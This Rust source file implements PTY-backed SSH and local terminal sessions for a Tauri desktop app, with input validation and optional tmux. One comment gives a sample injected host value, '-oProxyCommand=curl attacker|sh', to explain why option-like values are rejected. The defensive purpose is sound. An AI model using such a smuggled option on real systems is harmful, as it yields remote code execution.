//! SSH terminal over a local PTY. Generic enough to target any SSH host —
//! project remotes, entries from ~/.ssh/config, or ad-hoc saved hosts.
//!
//! `ssh -tt` is spawned inside a PTY pair so the remote shell gets a real TTY
//! (line editing, signals, colors, resize). Bytes are base64-encoded both ways
//! so binary-safe UTF-8 and ANSI escapes pass through untouched.

use base64::{engine::general_purpose::STANDARD as B64, Engine as _};
use parking_lot::Mutex;
use portable_pty::{native_pty_system, CommandBuilder, MasterPty, PtySize};
use serde::Deserialize;
use std::collections::HashMap;
use std::io::{Read, Write};
use std::sync::Arc;
use tauri::{AppHandle, Emitter, State};
use uuid::Uuid;

#[derive(Debug, Deserialize, Clone)]
pub struct TerminalTarget {
    /// When true, spawn a local shell on this machine instead of SSH'ing.
    /// All ssh-related fields below are ignored; only `initial_cwd` and
    /// (optionally) `shell` are honored.
    #[serde(default)]
    pub local: bool,
    /// Override the local shell. Defaults to $SHELL, then /bin/bash.
    #[serde(default)]
    pub shell: Option<String>,

    /// When set, we invoke `ssh <alias>` and let ~/.ssh/config own everything
    /// (ProxyJump, IdentityFile, User, Port, etc.).
    #[serde(default)]
    pub alias: Option<String>,

    /// Explicit user@host target. Required if `alias` is not set.
    #[serde(default)]
    pub user: Option<String>,
    #[serde(default)]
    pub host: Option<String>,

    #[serde(default)]
    pub port: Option<u16>,
    #[serde(default)]
    pub identity: Option<String>,   // path to private key
    #[serde(default)]
    pub proxy_jump: Option<String>, // user@jumphost
    #[serde(default)]
    pub initial_cwd: Option<String>,

    /// When true, wrap the remote shell in `tmux new -A -s <session>` so it
    /// survives disconnects. Requires tmux on the remote.
    #[serde(default)]
    pub use_tmux: bool,
    /// Tmux session name. Ignored unless `use_tmux` is true.
    #[serde(default)]
    pub tmux_session: Option<String>,
}

impl TerminalTarget {
    fn to_ssh_args(&self) -> Result<(Vec<String>, String), String> {
        // Reject caller-controlled values that could slide past as ssh options.
        // A saved host of "-oProxyCommand=curl attacker|sh" would otherwise be
        // interpreted as a flag by ssh's argv parser, yielding RCE.
        fn reject_option_like(name: &str, v: &str) -> Result<(), String> {
            if v.starts_with('-') {
                return Err(format!("{} must not start with '-' (got {:?})", name, v));
            }
            Ok(())
        }

        let mut args: Vec<String> = vec!["-tt".into()];
        args.push("-o".into()); args.push("ServerAliveInterval=30".into());

        if let Some(port) = self.port { args.push("-p".into()); args.push(port.to_string()); }
        if let Some(id) = &self.identity {
            reject_option_like("identity", id)?;
            args.push("-i".into()); args.push(id.clone());
        }
        if let Some(jump) = &self.proxy_jump {
            reject_option_like("proxy_jump", jump)?;
            args.push("-J".into()); args.push(jump.clone());
        }

        let (destination, label) = if let Some(alias) = &self.alias {
            reject_option_like("alias", alias)?;
            (alias.clone(), alias.clone())
        } else {
            let user = self.user.as_deref().ok_or("user or alias required")?;
            let host = self.host.as_deref().ok_or("host or alias required")?;
            reject_option_like("user", user)?;
            reject_option_like("host", host)?;
            let target = format!("{}@{}", user, host);
            (target.clone(), target)
        };
        // `--` separates ssh options from the destination + remote command, so
        // even if a future caller slips in an option-shaped value the parser
        // won't interpret it as a flag.
        args.push("--".into());
        args.push(destination);

        // Inner command that eventually execs the shell.
        let inner = match &self.initial_cwd {
            Some(dir) => format!("cd {} 2>/dev/null; exec $SHELL -l", shell_quote(dir)),
            None => "exec $SHELL -l".to_string(),
        };

        let remote_cmd = if self.use_tmux {
            // Attach to existing session or create one. If tmux is missing, fall
            // back to the plain shell so the user gets a usable terminal with a
            // readable error rather than a blank pane.
            let session = self.tmux_session.as_deref().unwrap_or("bishop");
            let session = sanitize_tmux_session(session);
            format!(
                "if command -v tmux >/dev/null 2>&1; then \
                    tmux new-session -A -s {s} 2>/dev/null || tmux attach -t {s}; \
                 else \
                    echo; echo '[bishop] tmux is not installed on this host — starting a regular shell.'; echo; \
                    {fallback}; \
                 fi",
                s = shell_quote(&session),
                fallback = inner,
            )
        } else {
            inner
        };
        args.push(remote_cmd);

        Ok((args, label))
    }
}

pub struct TerminalSessions {
    inner: Arc<Mutex<HashMap<String, Session>>>,
}

impl Default for TerminalSessions {
    fn default() -> Self { Self { inner: Arc::new(Mutex::new(HashMap::new())) } }
}

struct Session {
    master: Box<dyn MasterPty + Send>,
    writer: Box<dyn Write + Send>,
    child: Box<dyn portable_pty::Child + Send + Sync>,
}

#[tauri::command]
pub async fn start_terminal(
    app: AppHandle,
    sessions: State<'_, TerminalSessions>,
    target: TerminalTarget,
    cols: u16,
    rows: u16,
) -> Result<String, String> {
    let pty_system = native_pty_system();
    let pair = pty_system
        .openpty(PtySize { rows: rows.max(1), cols: cols.max(1), pixel_width: 0, pixel_height: 0 })
        .map_err(|e| format!("openpty: {}", e))?;

    let mut cmd = if target.local {
        // Local shell — spawn the user's login shell in the requested directory.
        let shell = target.shell.clone()
            .or_else(|| std::env::var("SHELL").ok())
            .unwrap_or_else(|| "/bin/bash".to_string());
        let mut c = CommandBuilder::new(&shell);
        c.arg("-l");
        c
    } else {
        let (ssh_args, _label) = target.to_ssh_args()?;
        let mut c = CommandBuilder::new("ssh");
        for a in ssh_args { c.arg(a); }
        c
    };

    // Inherit the parent process environment explicitly — portable-pty starts
    // with an empty env, which strips SSH_AUTH_SOCK, PATH, HOME, etc.
    for (k, v) in std::env::vars() { cmd.env(&k, &v); }
    cmd.env("TERM", "xterm-256color");

    // Starting directory:
    //   - Local: use initial_cwd if given, else HOME
    //   - SSH:   run ssh from HOME so it picks up ~/.ssh correctly
    let cwd = if target.local {
        target.initial_cwd
            .as_ref()
            .map(std::path::PathBuf::from)
            .filter(|p| p.is_dir())
            .or_else(|| dirs::home_dir())
    } else {
        dirs::home_dir()
    };
    if let Some(p) = cwd { cmd.cwd(p); }

    let child = pair.slave.spawn_command(cmd).map_err(|e| format!("spawn ssh: {}", e))?;
    let mut reader = pair.master.try_clone_reader().map_err(|e| format!("clone reader: {}", e))?;
    let writer = pair.master.take_writer().map_err(|e| format!("take writer: {}", e))?;

    let stream_id = Uuid::new_v4().to_string();
    let out_event = format!("term:{}:out", stream_id);
    let exit_event = format!("term:{}:exit", stream_id);

    sessions.inner.lock().insert(stream_id.clone(), Session {
        master: pair.master,
        writer,
        child,
    });

    let app_read = app.clone();
    let sessions_arc = sessions.inner.clone();
    let stream_id_c = stream_id.clone();
    std::thread::spawn(move || {
        let mut buf = [0u8; 4096];
        loop {
            match reader.read(&mut buf) {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    let encoded = B64.encode(&buf[..n]);
                    let _ = app_read.emit(&out_event, encoded);
                }
            }
        }
        let exit_code = {
            let mut map = sessions_arc.lock();
            let sess = map.remove(&stream_id_c);
            sess.and_then(|mut s| s.child.wait().ok().and_then(|es| es.exit_code().try_into().ok()))
        };
        let _ = app_read.emit(&exit_event, exit_code.unwrap_or(-1i32));
    });

    Ok(stream_id)
}

#[tauri::command]
pub async fn term_write(
    sessions: State<'_, TerminalSessions>,
    stream_id: String,
    data: String,
) -> Result<(), String> {
    let bytes = B64.decode(data.as_bytes()).map_err(|e| format!("bad base64: {}", e))?;
    let mut map = sessions.inner.lock();
    let sess = map.get_mut(&stream_id).ok_or_else(|| "terminal not found".to_string())?;
    sess.writer.write_all(&bytes).map_err(|e| format!("write: {}", e))?;
    Ok(())
}

#[tauri::command]
pub async fn term_resize(
    sessions: State<'_, TerminalSessions>,
    stream_id: String,
    cols: u16,
    rows: u16,
) -> Result<(), String> {
    let map = sessions.inner.lock();
    let sess = map.get(&stream_id).ok_or_else(|| "terminal not found".to_string())?;
    sess.master
        .resize(PtySize { rows: rows.max(1), cols: cols.max(1), pixel_width: 0, pixel_height: 0 })
        .map_err(|e| format!("resize: {}", e))?;
    Ok(())
}

#[tauri::command]
pub async fn term_close(
    sessions: State<'_, TerminalSessions>,
    stream_id: String,
) -> Result<(), String> {
    let mut map = sessions.inner.lock();
    if let Some(mut sess) = map.remove(&stream_id) {
        let _ = sess.child.kill();
    }
    Ok(())
}

fn shell_quote(s: &str) -> String {
    let escaped = s.replace('\'', "'\\''");
    format!("'{}'", escaped)
}

/// tmux session names can't contain ':' or '.'; keep it to [A-Za-z0-9_-].
fn sanitize_tmux_session(s: &str) -> String {
    let cleaned: String = s.chars()
        .map(|c| if c.is_ascii_alphanumeric() || c == '_' || c == '-' { c } else { '_' })
        .collect();
    let trimmed = cleaned.trim_matches('_');
    if trimmed.is_empty() { "bishop".to_string() } else { trimmed.to_string() }
}
